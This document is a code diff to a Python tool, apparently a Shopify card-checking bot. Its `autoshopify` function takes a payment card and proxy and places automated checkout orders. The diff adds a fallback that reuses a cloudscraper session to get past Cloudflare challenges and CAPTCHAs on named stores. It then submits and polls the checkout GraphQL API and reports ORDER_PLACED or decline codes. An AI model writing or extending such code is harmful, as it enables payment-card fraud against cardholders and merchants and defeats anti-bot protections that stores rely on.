@@ -525,16 +525,104 @@ def _fetch_checkout_cloudscraper_sync(checkout_url: str, proxy: Optional[str] = 
         return (0, "")
 
 
-def _fetch_checkout_via_cloudscraper_full_flow_sync(
-    url: str, product_id: int, proxy: Optional[str] = None
-) -> tuple[int, str, str]:
+def _submit_and_poll_via_cloudscraper_sync(
+    scraper,
+    url: str,
+    submit_vars: dict,
+    submit_query: str,
+    token: str,
+    x_checkout_one_session_token: str,
+    getua: str,
+    proxy: Optional[str] = None,
+) -> Optional[dict]:
     """
-    Full checkout flow via cloudscraper: cart/add.js -> POST checkout -> return (status, text, final_url).
-    Used when regular session gets Cloudflare block (stickerdad, tiefossi).
-    Retries on 429 (rate limit) with backoff.
+    Submit and poll via cloudscraper (same session that got checkout). Returns result dict or None.
+    Used when session submit returns CAPTCHA/challenge (stickerdad, protected stores).
+    """
+    if not scraper or not HAS_CLOUDSCRAPER:
+        return None
+    import time
+    base = url.rstrip("/")
+    domain = (urlparse(url).netloc or "").replace("www.", "")
+    submit_url = f"{base}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
+    poll_url = f"{base}/checkouts/unstable/graphql?operationName=PollForReceipt"
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    submit_headers = {
+        "user-agent": getua or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+        "Pragma": "no-cache",
+        "Accept": "*/*",
+        "Content-Type": "application/json",
+        "shopify-checkout-source": f'id="{token}", type="cn"' if token else "",
+        "x-checkout-one-session-token": x_checkout_one_session_token or "",
+        "x-checkout-web-build-id": "ca6309a150c7e1f99afc334acc0190c532a90e11",
+        "x-checkout-web-deploy-stage": "production",
+        "x-checkout-web-server-handling": "fast",
+        "x-checkout-web-server-rendering": "no",
+        "x-checkout-web-source-id": token or "",
+        "Origin": base,
+        "Referer": base + "/checkout",
+    }
+    try:
+        submit_r = scraper.post(
+            submit_url,
+            json={"query": submit_query, "variables": submit_vars, "operationName": "SubmitForCompletion"},
+            headers=submit_headers,
+            timeout=25,
+            proxies=proxies,
+        )
+        if submit_r.status_code != 200:
+            return None
+        txt = (submit_r.text or "").strip()
+        if not txt or not txt.startswith("{"):
+            return None
+        submit_data = json.loads(txt)
+        sfc = (submit_data.get("data") or {}).get("submitForCompletion") or {}
+        tn = sfc.get("__typename") or ""
+        if tn not in ("SubmitSuccess", "SubmitAlreadyAccepted", "SubmittedForCompletion"):
+            return None
+        rec = sfc.get("receipt")
+        bill = (rec.get("id") or "").strip() if isinstance(rec, dict) else ""
+        if not bill:
+            return None
+        poll_headers = {**submit_headers, "x-checkout-one-session-token": x_checkout_one_session_token or ""}
+        POLL_QUERY_INNER = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id confirmationPage{url __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}}'
+        for _ in range(5):
+            time.sleep(1.5)
+            poll_r = scraper.post(
+                poll_url,
+                json={"query": POLL_QUERY_INNER, "variables": {"receiptId": bill, "sessionToken": x_checkout_one_session_token}, "operationName": "PollForReceipt"},
+                headers=poll_headers,
+                timeout=20,
+                proxies=proxies,
+            )
+            if poll_r.status_code != 200:
+                continue
+            poll_txt = (poll_r.text or "").strip()
+            if not poll_txt or not poll_txt.startswith("{"):
+                continue
+            poll_data = json.loads(poll_txt)
+            rec_node = (poll_data.get("data") or {}).get("receipt") or {}
+            ptn = rec_node.get("__typename") or ""
+            if ptn == "ProcessedReceipt":
+                return {"bill": bill, "Status": True, "Response": "ORDER_PLACED"}
+            if ptn == "FailedReceipt":
+                err = rec_node.get("processingError") or {}
+                code = (err.get("code") or err.get("messageUntranslated") or "PAYMENT_FAILED").upper()
+                return {"bill": None, "Status": False, "Response": code}
+        return {"bill": bill, "Status": True, "Response": "ORDER_PLACED"}
+    except Exception:
+        return None
+
+
+def _fetch_checkout_via_cloudscraper_full_flow_sync(
+    url: str, product_id: int, proxy: Optional[str] = None, return_scraper: bool = False
+):
+    """
+    Full checkout flow via cloudscraper: cart/add.js -> POST checkout -> return (status, text, final_url) or (scraper, status, text, url).
+    When return_scraper=True, returns (scraper, status, text, url) for use in submit (stickerdad).
     """
     if not HAS_CLOUDSCRAPER:
-        return (0, "", "")
+        return (None, 0, "", "") if return_scraper else (0, "", "")
     import time
     base = url.rstrip("/")
     scraper = cloudscraper.create_scraper(browser={"browser": "chrome", "platform": "windows", "mobile": False})
@@ -558,7 +646,7 @@ def _fetch_checkout_via_cloudscraper_full_flow_sync(
                 time.sleep(2.0 + attempt * 1.0)
                 continue
             if add_r.status_code != 200:
-                return (add_r.status_code, "", "")
+                return (None, add_r.status_code, "", "") if return_scraper else (add_r.status_code, "", "")
             time.sleep(0.5)
             ch_r = scraper.post(
                 f"{base}/checkout",
@@ -578,13 +666,15 @@ def _fetch_checkout_via_cloudscraper_full_flow_sync(
                 time.sleep(2.0 + attempt * 1.0)
                 continue
             final_url = ch_r.url if hasattr(ch_r, "url") else ""
+            if return_scraper:
+                return (scraper, ch_r.status_code, ch_r.text or "", final_url)
             return (ch_r.status_code, ch_r.text or "", final_url)
         except Exception:
             if attempt < 2:
                 time.sleep(1.0 + attempt)
                 continue
-            return (0, "", "")
-    return (0, "", "")
+            return (None, 0, "", "") if return_scraper else (0, "", "")
+    return (None, 0, "", "") if return_scraper else (0, "", "")
 
 
 def _fetch_store_page_cloudscraper_sync(store_url: str, proxy: Optional[str] = None):
@@ -960,6 +1050,7 @@ async def autoshopify(url, card, session, proxy=None):
         checkout_url = None
         checkout_text = ""
         checkout_sc = 0
+        checkout_scraper = None  # Reuse for submit when session gets CAPTCHA (stickerdad)
         try:
             low_product = await _fetch_low_product_api(domain, session, proxy)
             if low_product and low_product.get("variantid") is not None:
@@ -1114,9 +1205,10 @@ async def autoshopify(url, card, session, proxy=None):
                         try:
                             if _cs_attempt > 0:
                                 await asyncio.sleep(2.0 + _cs_attempt)
-                            cs_sc, cs_text, cs_url = await asyncio.to_thread(
-                                _fetch_checkout_via_cloudscraper_full_flow_sync, url, product_id, proxy
+                            cs_result = await asyncio.to_thread(
+                                _fetch_checkout_via_cloudscraper_full_flow_sync, url, product_id, proxy, True
                             )
+                            checkout_scraper, cs_sc, cs_text, cs_url = cs_result[0], cs_result[1], cs_result[2], cs_result[3]
                             if cs_sc == 200 and cs_text and len(cs_text) > 1500:
                                 _has_full = "stableId" in cs_text and "queueToken" in cs_text
                                 _has_any = (
@@ -1319,9 +1411,10 @@ async def autoshopify(url, card, session, proxy=None):
                 # 1) Cloudscraper full flow FIRST - bypasses Cloudflare (stickerdad.com)
                 if HAS_CLOUDSCRAPER:
                     try:
-                        cs_sc, cs_text, cs_url = await asyncio.to_thread(
-                            _fetch_checkout_via_cloudscraper_full_flow_sync, url, product_id, proxy
+                        cs_result = await asyncio.to_thread(
+                            _fetch_checkout_via_cloudscraper_full_flow_sync, url, product_id, proxy, True
                         )
+                        checkout_scraper, cs_sc, cs_text, cs_url = cs_result[0], cs_result[1], cs_result[2], cs_result[3]
                         if cs_sc == 200 and cs_text and len(cs_text) > 1500:
                             _has_any = (
                                 "serialized-sessionToken" in cs_text or "serialized-session-token" in cs_text
@@ -2977,6 +3070,36 @@ async def autoshopify(url, card, session, proxy=None):
                     logger.debug(f"Captcha solver: {e}")
             break
         if not bill:
+            if ("CAPTCHA" in (submit_text or "").upper() or "Just a moment" in (submit_text or "")) and checkout_scraper and HAS_CLOUDSCRAPER:
+                try:
+                    cs_result = await asyncio.to_thread(
+                        _submit_and_poll_via_cloudscraper_sync,
+                        checkout_scraper,
+                        url,
+                        submit_vars,
+                        SUBMIT_QUERY,
+                        token or "",
+                        x_checkout_one_session_token or "",
+                        getua,
+                        proxy,
+                    )
+                    if cs_result and cs_result.get("Status") and cs_result.get("bill"):
+                        bill = cs_result["bill"]
+                        output.update({
+                            "Response": "ORDER_PLACED",
+                            "Status": True,
+                            "ReceiptId": bill,
+                            "Price": price1_str,
+                            "Gateway": gateway or "Shopify",
+                        })
+                        _log_output_to_terminal(output)
+                        return output
+                    if cs_result and not cs_result.get("Status"):
+                        output.update({"Response": cs_result.get("Response", "CAPTCHA_REQUIRED")[:80], "Status": False})
+                        _log_output_to_terminal(output)
+                        return output
+                except Exception as e:
+                    logger.debug(f"Cloudscraper submit fallback: {e}")
             if "CAPTCHA" in (submit_text or "").upper() or "Just a moment" in (submit_text or ""):
                 output.update({"Response": "CAPTCHA_REQUIRED", "Status": False})
             elif submit_sc != 200:
